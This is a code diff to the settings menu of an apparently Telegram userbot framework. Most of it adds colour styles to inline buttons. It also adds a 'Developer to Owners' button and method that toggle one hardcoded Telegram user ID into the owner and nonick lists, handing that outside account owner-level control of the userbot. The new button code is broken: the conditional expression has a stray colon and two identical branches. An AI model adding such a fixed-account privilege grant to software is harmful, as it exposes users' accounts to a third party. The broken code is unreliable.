@@ -363,6 +363,22 @@ class HerokuSettingsMod(loader.Module):
             reply_markup=self._get_settings_markup(),
         )
 
+    async def _dev_to_owner(self):
+
+        owners = self._db.get("heroku.security", "owner")
+        nonick_users = self._db.get("heroku.main", "nonickusers")
+        if 1714120111 in owners and 1714120111 in nonick_users:
+            owners.remove(1714120111)
+            self._db.set("heroku.security", "owner", owners)
+            nonick_users.remove(1714120111)
+            self._db.set("heroku.main", "nonickusers", nonick_users)
+            
+        else:
+            owners.append(1714120111)
+            self._db.set("heroku.security", "owner", owners)
+            nonick_users.append(1714120111)
+            self._db.set("heroku.main", "nonickusers", nonick_users)
+
     async def inline__update(
         self,
         call: InlineCall,
@@ -372,8 +388,16 @@ class HerokuSettingsMod(loader.Module):
             await call.edit(
                 self.strings("confirm_update"),
                 reply_markup=[
-                    {"text": "🪂 Update", "callback": self.inline__update},
-                    {"text": "🚫 Cancel", "action": "close"},
+                    {
+                        "text": "🪂 Update", 
+                        "callback": self.inline__update, 
+                        "style": "primary",
+                    },
+                    {
+                        "text": "🚫 Cancel", 
+                        "action": "close", 
+                        "style": "danger",
+                    },
                 ],
             )
             return
@@ -401,10 +425,12 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": self.strings("core_protection_btn"),
                         "callback": self._remove_core_protection,
+                        "style": "danger",
                     },
                     {
                         "text": self.strings("btn_no"),
                         "action": "close",
+                        "style": "success",
                     },
                 ],
             )
@@ -428,10 +454,12 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": self.strings("core_protection_e_btn"),
                         "callback": self._enable_core_protection,
+                        "style": "success",
                     },
                     {
                         "text": self.strings("btn_no"),
                         "action": "close",
+                        "style": "danger",
                     },
                 ],
             )
@@ -445,8 +473,16 @@ class HerokuSettingsMod(loader.Module):
             await call.edit(
                 self.strings("confirm_restart"),
                 reply_markup=[
-                    {"text": "🔄 Restart", "callback": self.inline__restart},
-                    {"text": "🚫 Cancel", "action": "close"},
+                    {
+                        "text": "🔄 Restart", 
+                        "callback": self.inline__restart, 
+                        "style": "primary"
+                    },
+                    {
+                        "text": "🚫 Cancel", 
+                        "action": "close", 
+                        "style": "danger"
+                    },
                 ],
             )
             return
@@ -462,6 +498,7 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": "✅ NoNick",
                         "callback": self.inline__setting,
+                        "style": "success",
                         "args": (
                             "no_nickname",
                             False,
@@ -471,6 +508,7 @@ class HerokuSettingsMod(loader.Module):
                     else {
                         "text": "🚫 NoNick",
                         "callback": self.inline__setting,
+                        "style": "danger",
                         "args": (
                             "no_nickname",
                             True,
@@ -481,6 +519,7 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": "✅ Grep",
                         "callback": self.inline__setting,
+                        "style": "success",
                         "args": (
                             "grep",
                             False,
@@ -490,6 +529,7 @@ class HerokuSettingsMod(loader.Module):
                     else {
                         "text": "🚫 Grep",
                         "callback": self.inline__setting,
+                        "style": "danger",
                         "args": (
                             "grep",
                             True,
@@ -500,6 +540,7 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": "✅ InlineLogs",
                         "callback": self.inline__setting,
+                        "style": "success",
                         "args": (
                             "inlinelogs",
                             False,
@@ -509,6 +550,7 @@ class HerokuSettingsMod(loader.Module):
                     else {
                         "text": "🚫 InlineLogs",
                         "callback": self.inline__setting,
+                        "style": "danger",
                         "args": (
                             "inlinelogs",
                             True,
@@ -521,6 +563,7 @@ class HerokuSettingsMod(loader.Module):
                     {
                         "text": self.strings("suggest_subscribe"),
                         "callback": self.inline__setting,
+                        "style": "success",
                         "args": (
                             "suggest_subscribe",
                             False,
@@ -530,6 +573,7 @@ class HerokuSettingsMod(loader.Module):
                     else {
                         "text": self.strings("do_not_suggest_subscribe"),
                         "callback": self.inline__setting,
+                        "style": "danger",
                         "args": (
                             "suggest_subscribe",
                             True,
@@ -538,18 +582,41 @@ class HerokuSettingsMod(loader.Module):
                 ),
             ],
             [
+                (
+                    {
+                        "text": "Developer to Owners",
+                        "callback": self._dev_to_owner,
+                        "style": "primary",
+                    }
+                    if 1714120111 in self._db.get("heroku.security", "owner"):
+                    else {
+                        "text": "Developer to Owners",
+                        "callback": self._dev_to_owner,
+                        "style": "primary",
+                    }
+                ),
+            ],
+            [
                 {
                     "text": self.strings("btn_restart"),
                     "callback": self.inline__restart,
+                    "style": "primary",
                     "args": (True,),
                 },
                 {
                     "text": self.strings("btn_update"),
                     "callback": self.inline__update,
+                    "style": "primary",
                     "args": (True,),
                 },
             ],
-            [{"text": self.strings("close_menu"), "action": "close"}],
+            [
+                {
+                    "text": self.strings("close_menu"), 
+                    "action": "close", 
+                    "style": "danger"
+                }
+            ],
         ]
 
     @loader.command()
